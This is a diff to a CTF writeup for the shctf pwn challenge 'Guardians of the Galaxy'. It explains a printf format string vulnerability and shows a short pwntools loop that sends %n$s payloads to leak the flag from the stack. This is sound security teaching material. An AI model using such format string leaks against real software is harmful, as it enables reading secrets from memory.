@@ -5,22 +5,30 @@ tags:
 - ctf
 - shctf
 - pwn
-description: "Writeup for the shctf pwn challenge [Guardians of the Galaxy]."
+description: "Writeup for the shctf pwn challenge \"Guardians of the Galaxy\"."
 permalink: ctfs/shctf/pwn/guardians-of-the-galaxy/
 thumbnail: https://enscribe.dev/image/banner-ctfs.png
 ---
 
-## 📜 Description
+<style>
+    .box {
+        border: 1px solid rgba(100, 100, 100, .5);
+        padding: 1rem;
+        font-size: 90%;
+        text-align: center;
+    }
+    .flex-container {
+        display: flex;
+        flex-wrap: nowrap;
+        justify-content: center;
+    }
+</style>
 
-Ronan the Accuser has the Power Stone. Can Starlord find a successful distraction format?
-`nc 0.cloud.chals.io 12690`
-**Author**: GlitchArchetype
-
-* [guardians](https://github.com/WhileSEC/shctf/blob/main/challenges/pwn/guardians-of-the-galaxy/files/guardians)
-
----
-
-## 🔍 Detailed Solution
+<p class="box">
+Ronan the Accuser has the Power Stone. Can Starlord find a successful distraction format? <code>nc 0.cloud.chals.io 12690</code><br>
+<b>Author</b>: GlitchArchetype<br>
+<b>Files</b>: <a href="https://github.com/WhileSEC/shctf/blob/main/challenges/pwn/guardians-of-the-galaxy/files/guardians">guardians</a>
+</p>
 
 Let's look at what happens when you run that binary given to us.
 
@@ -37,7 +45,7 @@ $ ./guardians
 Does Quill manage to win the dance battle?
 ```
 
-There, we got it to work locally. Since we know that this is problem a format string vulnerability from the "find a successful distraction format" part of the description, let's assume that the vulnerability is it writing our input to the stack with `printf()`. We will need to work our way up the stack with the format `%n$s`, where `n` is the decimal index of the argument you want, and `s` is the `printf()` specifier for a **string of characters**. I wrote this Python/pwntools script here to achieve this loop:
+There, we got it to work locally. Since we know that this is problem a format string vulnerability from the "find a successful distraction format" part of the description, let's assume that the vulnerability is it writing our input to the stack with `printf()`. We will need to work our way up the stack with the format `%n$s`, where `n` is the decimal index of the argument you want, and `s` is the `printf()` specifier for a **string of characters**. I wrote this Python3/pwntools script here to achieve this loop:
 
 ```py
 from pwn import *
@@ -47,7 +55,7 @@ for i in range(0, 100):
         log.info(f"Trying offset {i}...")
         p.sendline(bytes(('%' + str(i) + '$s'), encoding='utf-8'))
 
-        output = p.readS()
+        output = p.recvS()
         if 'shctf' in output:
                 log.success(output)
                 break
